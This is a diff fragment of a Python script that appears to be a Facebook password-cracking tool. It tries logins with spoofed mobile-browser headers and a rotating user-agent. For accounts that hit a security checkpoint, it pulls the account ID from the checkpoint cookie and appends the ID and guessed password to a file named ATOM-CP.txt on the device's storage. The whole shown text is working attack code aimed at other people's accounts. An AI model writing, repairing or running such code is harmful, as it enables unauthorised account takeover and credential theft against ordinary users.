@@ -1374,8 +1374,8 @@ def p(uid,pwx,tl):
 'content-length': '510',
 'sec-ch-ua': '"Not.A/Brand";v="20", "Chromium";v="112", "Google Chrome";v="110"',
 'sec-ch-ua-mobile': '?1',
-'user-agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A Build/W92W4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.3899.81 Mobile Safari/537.36,gzip(gfe)',
-'viewport-width': '510',
+'user-agent': ua,
+'viewport-width': '500',
 'content-type': 'application/x-www-form-urlencoded',
 'x-fb-lsd': 'AVpVfmlFIc8',
 'sec-ch-ua-platform-version': '"9.0.0"',
@@ -1421,8 +1421,7 @@ def p(uid,pwx,tl):
                 else:
                     break
             elif 'checkpoint' in response:
-                coki=";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
-                uid = "1000"+coki[0:11]
+                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
                 #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
@@ -1435,7 +1434,6 @@ def p(uid,pwx,tl):
     except Exception as error:
         #print({error})
         pass
-
 
 def x(uid,pwx,tl):
     global oks
